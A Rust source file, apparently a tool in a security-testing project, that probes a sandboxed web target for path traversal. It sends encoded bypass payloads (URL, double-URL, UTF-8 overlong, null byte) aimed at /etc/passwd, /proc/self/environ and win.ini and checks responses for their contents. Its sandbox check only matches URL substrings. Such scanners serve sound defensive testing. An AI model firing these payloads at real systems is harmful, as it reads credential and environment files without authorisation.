/// ShieldAGI Tool: path_traverse
///
/// Tests for directory/path traversal vulnerabilities using multi-encoding
/// bypass techniques and null byte injection.

use serde::{Deserialize, Serialize};
use std::process::Command;

#[derive(Debug, Serialize, Deserialize)]
pub struct PathTraversalResult {
    pub target_url: String,
    pub parameter: String,
    pub vulnerable: bool,
    pub traversals: Vec<TraversalAttempt>,
    pub total_successful: usize,
    pub max_encoding_level: u32,
    pub severity: String,
    pub scan_duration_ms: u64,
    pub error: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct TraversalAttempt {
    pub payload: String,
    pub encoding: String,
    pub target_file: String,
    pub success: bool,
    pub status_code: u16,
    pub evidence: Option<String>,
}

/// Known file contents to detect successful traversal
const TRAVERSAL_TARGETS: &[(&str, &str, &[&str])] = &[
    ("/etc/passwd", "../../../../../../etc/passwd", &["root:", "bin:", "daemon:"]),
    ("/etc/hosts", "../../../../../../etc/hosts", &["localhost", "127.0.0.1"]),
    ("/etc/hostname", "../../../../../../etc/hostname", &[]),
    ("/proc/self/environ", "../../../../../../proc/self/environ", &["PATH=", "HOME="]),
    ("/proc/version", "../../../../../../proc/version", &["Linux"]),
    ("win.ini", "..\\..\\..\\..\\..\\..\\windows\\win.ini", &["[fonts]", "[extensions]"]),
];

/// Encoding strategies for bypass
fn encode_payload(payload: &str, level: u32) -> Vec<(String, String)> {
    let mut encoded = vec![(payload.to_string(), "none".to_string())];

    if level >= 1 {
        // URL encoding
        encoded.push((
            payload.replace("../", "%2e%2e%2f").replace("..\\", "%2e%2e%5c"),
            "url-encoded".to_string(),
        ));
        // Double URL encoding
        encoded.push((
            payload.replace("../", "%252e%252e%252f"),
            "double-url-encoded".to_string(),
        ));
    }

    if level >= 2 {
        // Unicode / UTF-8 encoding
        encoded.push((
            payload.replace("../", "..%c0%af").replace("..\\", "..%c1%9c"),
            "utf8-overlong".to_string(),
        ));
        // Null byte injection (pre-fix era bypass)
        encoded.push((
            format!("{}%00.png", payload),
            "null-byte".to_string(),
        ));
        // Dot-dot-slash variations
        encoded.push((
            payload.replace("../", "....//").replace("..\\", "....\\\\"),
            "doubled-dots".to_string(),
        ));
    }

    if level >= 3 {
        // Mixed encoding
        encoded.push((
            payload.replace("../", "%2e%2e/").replace("..\\", "%2e%2e\\"),
            "mixed-encoding".to_string(),
        ));
        // URL encoding of just dots
        encoded.push((
            payload.replace("../", ".%2e/").replace("..\\", ".%2e\\"),
            "partial-encoding".to_string(),
        ));
        // Backslash on Unix (some frameworks normalize)
        encoded.push((
            payload.replace("../", "..\\"),
            "backslash-unix".to_string(),
        ));
    }

    encoded
}

pub async fn tool_path_traverse(input: &serde_json::Value) -> Result<String, String> {
    let target_url = input["target_url"]
        .as_str()
        .ok_or("Missing 'target_url' field")?;

    if !is_sandbox_target(target_url) {
        return Err("SAFETY: path_traverse can only target sandbox URLs".into());
    }

    let parameter = input["parameter"]
        .as_str()
        .ok_or("Missing 'parameter' field")?;

    let method = input["method"].as_str().unwrap_or("GET");
    let encoding_levels = input["encoding_levels"].as_u64().unwrap_or(3) as u32;

    let start = std::time::Instant::now();
    let mut traversals = Vec::new();

    for (target_file, base_payload, signatures) in TRAVERSAL_TARGETS {
        let encoded_payloads = encode_payload(base_payload, encoding_levels);

        for (payload, encoding) in &encoded_payloads {
            let (status_code, body) = if method == "GET" {
                // For GET, inject into URL parameter
                let url = if target_url.contains(&format!(":{}", parameter)) {
                    // Path parameter style: /api/files/:filename
                    target_url.replace(&format!(":{}", parameter), payload)
                } else if target_url.contains(&format!("{{{}}}", parameter)) {
                    target_url.replace(&format!("{{{}}}", parameter), payload)
                } else {
                    let sep = if target_url.contains('?') { "&" } else { "?" };
                    format!("{}{}{}={}", target_url, sep, parameter, payload)
                };
                make_get_request(&url)
            } else {
                let body = format!("{}={}", parameter, payload);
                make_post_request(target_url, &body)
            };

            // Check if traversal was successful
            let mut success = false;
            let mut evidence = None;

            if status_code >= 200 && status_code < 400 && !body.is_empty() {
                if !signatures.is_empty() {
                    for sig in *signatures {
                        if body.contains(sig) {
                            success = true;
                            evidence = Some(format!(
                                "Response contains '{}' from {}",
                                sig, target_file
                            ));
                            break;
                        }
                    }
                } else if body.len() > 10 && !body.contains("not found") && !body.contains("error") {
                    // No specific signature but got content
                    success = true;
                    evidence = Some(format!(
                        "Got {} bytes response (possible {} content)",
                        body.len(),
                        target_file
                    ));
                }
            }

            traversals.push(TraversalAttempt {
                payload: payload.clone(),
                encoding: encoding.clone(),
                target_file: target_file.to_string(),
                success,
                status_code,
                evidence,
            });
        }
    }

    let duration = start.elapsed().as_millis() as u64;
    let total_successful = traversals.iter().filter(|t| t.success).count();
    let vulnerable = total_successful > 0;

    let severity = if traversals.iter().any(|t| {
        t.success && (t.target_file.contains("passwd") || t.target_file.contains("environ"))
    }) {
        "CRITICAL"
    } else if total_successful >= 2 {
        "HIGH"
    } else if total_successful >= 1 {
        "MEDIUM"
    } else {
        "LOW"
    };

    let result = PathTraversalResult {
        target_url: target_url.to_string(),
        parameter: parameter.to_string(),
        vulnerable,
        traversals,
        total_successful,
        max_encoding_level: encoding_levels,
        severity: severity.to_string(),
        scan_duration_ms: duration,
        error: None,
    };

    Ok(serde_json::to_string_pretty(&result).unwrap())
}

fn make_get_request(url: &str) -> (u16, String) {
    let args = vec![
        "-s", "-o", "/dev/stdout",
        "-w", "\n%{http_code}",
        "--max-time", "10",
        url,
    ];

    match Command::new("curl").args(&args).output() {
        Ok(output) => {
            let full = String::from_utf8_lossy(&output.stdout);
            let parts: Vec<&str> = full.trim().rsplitn(2, '\n').collect();
            let code: u16 = parts.first().and_then(|s| s.trim().parse().ok()).unwrap_or(0);
            let body = parts.last().unwrap_or(&"").to_string();
            (code, body)
        }
        Err(_) => (0, String::new()),
    }
}

fn make_post_request(url: &str, body: &str) -> (u16, String) {
    let args = vec![
        "-s", "-o", "/dev/stdout",
        "-w", "\n%{http_code}",
        "-X", "POST",
        "-d", body,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "--max-time", "10",
        url,
    ];

    match Command::new("curl").args(&args).output() {
        Ok(output) => {
            let full = String::from_utf8_lossy(&output.stdout);
            let parts: Vec<&str> = full.trim().rsplitn(2, '\n').collect();
            let code: u16 = parts.first().and_then(|s| s.trim().parse().ok()).unwrap_or(0);
            let body = parts.last().unwrap_or(&"").to_string();
            (code, body)
        }
        Err(_) => (0, String::new()),
    }
}

fn is_sandbox_target(url: &str) -> bool {
    url.contains("172.28.")
        || url.contains("shieldagi-")
        || url.contains("localhost:3001")
        || url.contains("vulnerable-app")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encode_payload() {
        let payloads = encode_payload("../../etc/passwd", 3);
        assert!(payloads.len() > 5);
        assert_eq!(payloads[0].1, "none");
    }
}
